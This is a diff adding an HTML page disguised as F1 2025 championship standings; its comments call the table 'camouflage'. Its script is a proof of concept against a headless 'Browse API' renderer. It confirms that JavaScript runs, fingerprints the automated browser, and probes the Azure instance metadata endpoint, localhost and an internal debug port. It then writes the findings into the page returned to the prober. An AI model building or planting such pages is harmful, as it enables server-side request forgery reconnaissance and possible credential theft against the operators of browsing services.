@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>F1 2025 Rankings — Dynamic Render PoC</title>
+</head>
+<body>
+
+<!-- ============================================================
+     STATIC CONTENT (always present, even without JS)
+     The Browse API should return this regardless of renderDynamicPages
+     ============================================================ -->
+<h1>F1 2025 Championship Standings</h1>
+<p id="static-marker">STATIC_CONTENT_MARKER: This text is in the raw HTML.</p>
+
+<!-- ============================================================
+     JS-RENDERED CONTENT (only appears if headless browser runs JS)
+     If Browse API returns this text, JS execution is CONFIRMED.
+     ============================================================ -->
+<div id="js-proof"></div>
+<div id="browser-fingerprint"></div>
+<div id="network-probe-results"></div>
+
+<script>
+// ── STEP 1: Write a proof marker that ONLY exists if JS executes ──
+document.getElementById('js-proof').innerText =
+    'JS_EXECUTION_CONFIRMED: JavaScript was executed by the renderer. ' +
+    'Timestamp: ' + new Date().toISOString();
+
+// ── STEP 2: Fingerprint the headless browser environment ──
+var fp = {
+    userAgent:    navigator.userAgent,
+    platform:     navigator.platform,
+    language:     navigator.language,
+    cookieEnabled: navigator.cookieEnabled,
+    screenWidth:  screen.width,
+    screenHeight: screen.height,
+    colorDepth:   screen.colorDepth,
+    timezone:     Intl.DateTimeFormat().resolvedOptions().timeZone,
+    webdriver:    navigator.webdriver,           // true = headless/automated
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory || 'N/A',
+    windowSize:   window.innerWidth + 'x' + window.innerHeight,
+    href:         window.location.href,
+    protocol:     window.location.protocol,
+    plugins:      navigator.plugins.length,
+    // Headless detection signals
+    headlessSignals: []
+};
+
+// Check common headless browser indicators
+if (navigator.webdriver) fp.headlessSignals.push('webdriver=true');
+if (!window.chrome)      fp.headlessSignals.push('window.chrome missing');
+if (navigator.plugins.length === 0) fp.headlessSignals.push('no plugins');
+if (screen.width === 0 || screen.height === 0) fp.headlessSignals.push('zero screen dimensions');
+
+document.getElementById('browser-fingerprint').innerText =
+    'BROWSER_FINGERPRINT: ' + JSON.stringify(fp);
+
+// ── STEP 3: Safe network probes (non-destructive, detection only) ──
+// These test what the headless browser can reach from its network position.
+// Each probe just checks if a connection succeeds or fails.
+var probeResults = [];
+
+var probes = [
+    // Test 1: Can the headless browser reach the public internet?
+    { label: 'public-internet', url: 'https://httpbin.org/ip' },
+
+    // Test 2: Can it reach Azure IMDS? (critical SSRF indicator)
+    { label: 'azure-imds', url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
+
+    // Test 3: Can it reach localhost?
+    { label: 'localhost-80', url: 'http://127.0.0.1/' },
+
+    // Test 4: Can it reach the XAP debug endpoint from inside?
+    { label: 'localhost-89', url: 'http://127.0.0.1:89/' }
+];
+
+var completed = 0;
+
+probes.forEach(function(probe) {
+    var controller = new AbortController();
+    var timeoutId = setTimeout(function() { controller.abort(); }, 3000);
+
+    fetch(probe.url, {
+        mode: 'no-cors',
+        signal: controller.signal,
+        headers: probe.label === 'azure-imds' ? { 'Metadata': 'true' } : {}
+    })
+    .then(function(r) {
+        clearTimeout(timeoutId);
+        probeResults.push({
+            label: probe.label,
+            status: 'REACHABLE',
+            httpStatus: r.status,
+            type: r.type  // 'opaque' for no-cors, 'basic' for same-origin
+        });
+    })
+    .catch(function(e) {
+        clearTimeout(timeoutId);
+        probeResults.push({
+            label: probe.label,
+            status: e.name === 'AbortError' ? 'TIMEOUT' : 'BLOCKED',
+            error: e.message
+        });
+    })
+    .finally(function() {
+        completed++;
+        if (completed === probes.length) {
+            document.getElementById('network-probe-results').innerText =
+                'NETWORK_PROBES: ' + JSON.stringify(probeResults);
+        }
+    });
+});
+
+// ── STEP 4: Fallback — write results after 4 seconds even if probes hang ──
+setTimeout(function() {
+    if (completed < probes.length) {
+        document.getElementById('network-probe-results').innerText =
+            'NETWORK_PROBES_PARTIAL: ' + JSON.stringify(probeResults) +
+            ' (timed out waiting for ' + (probes.length - completed) + ' probes)';
+    }
+}, 4000);
+</script>
+
+<!-- Static F1 content (camouflage for the PoC page) -->
+<table border="1">
+    <tr><th>Pos</th><th>Driver</th><th>Team</th><th>Points</th></tr>
+    <tr><td>1</td><td>Max Verstappen</td><td>Red Bull Racing</td><td>51</td></tr>
+    <tr><td>2</td><td>Lando Norris</td><td>McLaren</td><td>42</td></tr>
+    <tr><td>3</td><td>Charles Leclerc</td><td>Ferrari</td><td>37</td></tr>
+</table>
+
+</body>
+</html>
